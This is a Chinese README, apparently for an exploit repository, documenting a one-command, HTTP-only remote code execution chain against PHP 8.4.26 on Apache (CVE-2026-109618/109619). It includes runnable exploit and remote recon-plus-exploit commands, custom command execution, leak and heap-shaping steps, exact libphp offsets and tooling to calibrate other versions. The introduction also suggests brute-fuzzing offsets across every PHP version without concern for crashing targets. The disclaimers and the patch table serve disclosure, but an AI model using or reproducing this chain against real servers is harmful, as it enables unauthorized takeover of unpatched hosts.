# php2shell - 官方环境 无需display_errors，不修改memory_limit

中文 | [English](readme_en.md)

**单 worker prefork。**环境下在完全远程、只用 HTTP、目标页面只有 `<?php echo "OK\n"; ?>`、不写目标侧
PHP 的约束下，一条命令拿到 RCE：

- stock 官方镜像 + 官方 ini：**5/5**
- 带符号的同一官方构建（gdb 只用于离线标定，不在交付路径）：**15/15**
- 单次约 2 秒，worker 不重启，目标 ini 未改

# 通用利用

理论上只要你计算出所有php版本的偏移，然后利用这些偏移批量去fuzz，总有一条fuzz是能rce的。反正worker崩了也会重启，不怕目标打挂。

关于worker，目前单worker不影响目标实现，只影响胜率，在测试环境先临时使用单worker来装逼，完整官方worker环境之后放出。

## 快速开始（官方 php.ini-production / display_errors=Off / 128M）

```bash
git clone https://github.com/9bie/php2shell-bypass-aslr-exp.git
cd php2shell-bypass-aslr-exp

# 1) 起目标：stock 官方镜像；容器里只把官方 php.ini-production 复制成 php.ini
./pure/run_pure.sh
# target: OK
# PHP 8.4.26 ...
# display_errors => Off => Off
# memory_limit => 128M => 128M

# 2) 一条命令：A1 -> B1 泄漏 -> A2 -> B2 -> id
python3 exploit.py --port 18110
# [try 1] A1: END-cleanup send_cookie OOM
# [try 1] B1: stale-id OOB read (chunk base + libphp)
#       decoded=819208 zval_ptr_dtor=0x7fe00ef5db60 -> libphp=0x7fe00e8ff000
#       chunk buckets: [('0x7fe00c600000', 7495), ('0x7fe00ee00000', 1095),
#                       ('0x7fe00cc00000', 87), ('0x7fe00c400000', 79)]
# [try 1] A2 + B2: main=0x7fe00cc00000 S=0x7fe00ccf8398 zif_system=0x7fe00ed64370
# [4/4] RCE OK; proof .../out/p1:
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

不编译 PHP/Apache、不 build 镜像、不挂 gdb、不改目标 ini。
`pure/run_pure.sh` 默认容器 `p2s-pure-18110`、端口 `18110`，起完会打印
实际的 `display_errors` / `memory_limit` / `post_max_size` 等值。
Linux 上没有 docker 组权限时脚本会自动改用 `sudo docker`，也可以显式
`DOCKER="sudo docker" ./pure/run_pure.sh`；`--dbg` 仅用于换成带符号的
同一构建做离线标定。

常用参数：

```bash
# 换新 ASLR 复测（重启容器）
python3 exploit.py --port 18110 --restart p2s-pure-18110

# 自定义命令：把脚本写进挂载目录，再用 sh 执行
printf 'id; uname -a > /out/p1\n' > out/c
python3 exploit.py --port 18110 --cmd 'sh</out/c'
```

## 安全预检与一键利用（recon 子命令）

`recon` 子命令先做被动探测 + 一次普通小 POST
（带 `Content-Length`、约 100B，远低于
`post_max_size`），检查 A1 的门槛
（`session.upload_progress.enabled`）和版本/构建
是否匹配，**不发送 chunked、不做堆整形、不触发
OOM**；加 `--exploit` 后，探测到 RCE-verified
 profile 的版本会用该 profile 的偏移和阶段参数
直接跑完整条链——一条命令完成：

```bash
# 本机目标
python3 exploit.py recon --port 18110
# 远程目标：IP、主机名或完整 URL 均可（自动去掉 scheme/路径）
python3 exploit.py recon --host 192.0.2.10 --port 80
python3 exploit.py recon --host https://example.com --port 80

# 容器内自省（ini / MPM / SAPI 需要 docker exec）
python3 exploit.py recon --port 18110 --container p2s-pure-18110

# 一键利用：探测版本 -> 选 profile -> A1 -> B1 -> A2 -> B2
python3 exploit.py recon --host https://TARGET --port 443 --exploit
#   PHP 8.4.26: profile php-8.4.26-trixie-amd64 -
#                 RCE-verified calibration
#   exploit: using profile php-8.4.26-trixie-amd64
#   [try 1] A1: ...
#   [4/4] RCE OK; proof .../out/p1: uid=33(www-data) ...

# 自定义命令
python3 exploit.py recon --host TARGET --exploit \
    --cmd 'sh</out/c'
```

`--exploit` 的安全边界：只有 `rce_verified=true`
的 profile（目前仅 8.4.26）会跑；其它版本（符号
已标定但堆布局未标定）会明确拒绝并说明原因。
`--force` 强制覆盖该拒绝（先大声 WARNING，
再用 8.4.26 占位的 S/hsv 与阶段参数运行——
大概率失败或打崩 worker）。`--retries` 默认 3；
如果某次越界窗口里最常见的指针不是
`zval_ptr_dtor`，脚本会用 `libphp-main`
的合理区间检查丢弃这次泄漏，整条链重来。

### 标定其它版本（`tools/calibrate.py`）

符号偏移（`zif_system`、`zval_ptr_dtor`）可离线
按构建抓取；堆布局字段（`S`、`hsv`、阶段参数）
需要同构建的实验室容器。`tools/calibrate.py`
在本机 **podman**（或 docker）容器里跑链、扫
`S`/`hsv`，成功后写入 `rce_verified=true` 的
profile：

```bash
python3 tools/calibrate.py --tag 8.4.26-apache
# -> profiles/php-8.4.26-...json (rce_verified=true)
```

**前提：该构建的 A1 OOM 必须是"可控的"（worker
带堆存活）。** PHP 8.5.x 改了 OOM 路径——堆被破坏
（`zend_mm_heap corrupted`），worker 在 B1 的
stale-id 读取之前就 abort（signal 6），所以当前
原语在 8.5.x 上打不出泄漏，标定也会干净地失败并
说明原因；需要先做"亚 OOM"的堆整形变体。
已验证目标是 PHP 8.4.26（及更早的 8.4）。

## 这条纯 HTTP 链

目标页面只有 `<?php echo "OK\n"; ?>`，攻击流量只有 chunked multipart
和普通 GET/POST：

1. **chunked 绕过 `post_max_size`**：不带 `Content-Length` 时
   `content_length=0`，`rfc1867_post_handler` 开头的检查被跳过，
   可以发送远大于 8M 的 body 做堆整形。
2. **A1**：860 个 depth-64 嵌套文件字段 + filler + 大值 + 4000B
   `PHP_SESSION_UPLOAD_PROGRESS`，在 END cleanup 的 `php_url_encode`
   里 OOM；bailout 留下悬空的 `PS(id)` / `PS(mod_data)`，`send_cookie=1`。
3. **B1（越界读）**：安全 close 后让 `PS(id)` 指向伪造的
   `zend_string` 头（len=0xC8000，data 含 `/`），`Set-Cookie` 把 id
   chunk 之后 800KB 内存编码出来。窗口里同时有：
   - 2MiB 对齐的 chunk 指针簇 → id chunk / main chunk base；
   - `G:400` 在 id chunk 尾部留下的洞被 900 个嵌套数组字段填满，
     真实 HashTable 的 `pDestructor = zval_ptr_dtor` 出现 1095 次
     → `libphp = 值 - 0x65EB60`。
4. **A2 + B2**：cheap-OOM 把 `PS(hash_serialize_verifier)` 指到堆上
   (`main+0x7D720`)；B2 用 384B 引用值把它覆盖成指向
   `S=main+0xF8398` 的 zval，S 处伪造 zend_array 的
   `pDestructor = zif_system` (`libphp+0x465370`)，shutdown 时
   `zend_hash_destroy` 调用 `system("id>/out/p1")`。

偏移（本构建，ASLR 无关）：

| 符号/位置 | 值 |
|---|---|
| `zval_ptr_dtor` | `libphp+0x65EB60` |
| `zif_system` | `libphp+0x465370` |
| fake array `S` | `main+0xF8398` |
| A2 的 `hsv` | `main+0x7D720` |

目标环境：Debian 13 (trixie)、Apache 2.4.69 prefork、PHP 8.4.26 NTS
mod_php、files session handler。ASLR 每次容器启动会变，链上两次泄漏
会自己算出来。换 PHP 构建/版本需要标定，见下节。

## 多版本标定（profiles/ 目录）

偏移按**构建**区分（如 `zif_system` 在 8.4.26 是
`libphp+0x465370`，8.5.11 是 `libphp+0x5996e0`），
所以每条链需要一条 profile：

```bash
# 1) 离线标定：直接从 Docker Registry 拉官方镜像的
#    libphp.so，解析 ELF 符号表（约 20 秒/版本，
#    不需要 docker daemon）
python3 tools/registry_scrape.py --tag 8.5.11-apache --write
#    -> profiles/php-8.5.11-trixie-amd64.json
#       （rce_verified=false：只有符号偏移，
#        S/hsv/堆整形参数仍是 8.4.26 占位）

# 2) 有容器时的完整标定（含 profile 落盘）：
python3 docker/offsets.py p2s-pure-18110
#    -> out/offsets.env + profiles/php-<ver>-calibrated-amd64.json

# 3) recon 按探测到的 PHP 版本自动选 profile
python3 exploit.py recon --host TARGET --port 80
#    PHP 8.5.11: profile php-8.5.11-trixie-amd64 - catalog row,
#                NOT RCE-verified yet
```

`profiles/php-8.4.26-trixie-amd64.json` 是唯一
`rce_verified=true` 的行（本 README 的 5/5 + 15/15
验证）。其它行（8.1.34 / 8.2.34 / 8.3.35 / 8.4.25 /
8.5.11）只完成了符号标定：`zif_system` /
`zval_ptr_dtor` 来自官方镜像 ELF，但 `S=main+0xF8398`
、`hsv=main+0x7D720` 和 A1/A2/B1/B2 的堆整形参数
（`--big 78`、`--parts 880 --depth 64 --fillers 115`
、`--vl 384 --n1 500 --n2 495`、`LEAK_SPEC`）都依赖
该构建的堆布局，**必须在真实容器里重新标定后才能
用于利用**（见 pure/RESEARCH_PURE_128M.md §3/§6 的
标定方法）。

## 漏洞背景（CVE-2026-109618 / CVE-2026-109619）

本仓库实现的原语类与 2026-10-21 公开的
**PHP2Shell**（CVE-2026-109618 / CVE-2026-109619，
CVSS 9.2）一致：PHP 自身 OOM `longjmp()` 路径的
会话/上传进度状态残留 → 堆越界读 → 伪造
`pDestructor` RCE。官方修复版本：

| 分支 | 首个修复版本 |
|---|---|
| 8.2 | 8.2.35 |
| 8.3 | 8.3.36 |
| 8.4 | 8.4.27 |
| 8.5 | 8.5.12 |

本仓库目标（8.4.26）是 8.4 分支最后一个受影响版本。
仅用于授权环境的漏洞研究与复现；发现未修复目标请
报告给所有者并升级到上表版本。

## 证据

- 机制与标定：[pure/RESEARCH_PURE_128M.md](pure/RESEARCH_PURE_128M.md)
- 全链脚本：[exploit.py](exploit.py)（`pure/pwn_pure.py` 保留为别名）
- 调试镜像批量日志：[pure/evidence/pwn_pure_batch_20261022.log](pure/evidence/pwn_pure_batch_20261022.log)
- 官方镜像日志：[pure/evidence/pwn_pure_official_20261022.log](pure/evidence/pwn_pure_official_20261022.log)
- proof：[pure/evidence/pwn_pure_proof_p1.txt](pure/evidence/pwn_pure_proof_p1.txt)

## 旧线（legacy，非本目标）

早期提交里的 `exploit.py` 走的是**自定义** `docker/php.ini`
（`display_errors=On`、`memory_limit=8M`、`max_input_vars=1000`），
与本 README 的官方配置目标无关，已归档到
[archive/legacy-8m/exploit.py](archive/legacy-8m/exploit.py)；
同目录下的 [HTTP_HEAP_LEAK.md](archive/legacy-8m/HTTP_HEAP_LEAK.md)、
[ASLR_PURE_HTTP.md](archive/legacy-8m/ASLR_PURE_HTTP.md) 等描述的是那一线。

## 复现声明

- 目标配置就是官方 `php.ini-production`（`display_errors=Off`、
  `memory_limit=128M`）：没有自定义 ini、没有 `display_errors=On`
  依赖、没有目标侧文件、没有 `session_start()`、交付路径不用 gdb。
- 仅用于授权环境中的漏洞研究与复现。
